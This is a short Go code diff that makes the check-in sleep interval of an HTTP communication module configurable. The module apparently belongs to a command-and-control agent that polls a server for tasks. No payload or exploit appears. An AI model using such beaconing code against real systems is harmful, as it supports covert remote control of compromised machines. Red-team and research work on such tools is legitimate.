@@ -13,11 +13,12 @@ type HttpCommModule struct {
 	BaseCommModule
 	ConnectAddress string
 	ConnectPort    int
+	Sleep          int
 	tokenSource    chan bool
 	client         *http.Client
 }
 
-func NewHttpCommModule(connectAddress string, connectPort int) *HttpCommModule {
+func NewHttpCommModule(connectAddress string, connectPort int, Sleep int) *HttpCommModule {
 	return &HttpCommModule{
 		BaseCommModule: BaseCommModule{
 			Inbound:  make(chan *AgentTask),
@@ -25,6 +26,7 @@ func NewHttpCommModule(connectAddress string, connectPort int) *HttpCommModule {
 		},
 		ConnectAddress: connectAddress,
 		ConnectPort:    connectPort,
+		Sleep:          Sleep,
 		client:         &http.Client{},
 		tokenSource:    make(chan bool),
 	}
@@ -58,7 +60,7 @@ func (h *HttpCommModule) Start() chan bool {
 				} else {
 					h.checkIn()
 				}
-				time.Sleep(5 * time.Second) // SLEEP
+				time.Sleep(time.Duration(h.Sleep) * time.Second)
 			}
 		}
 	}()
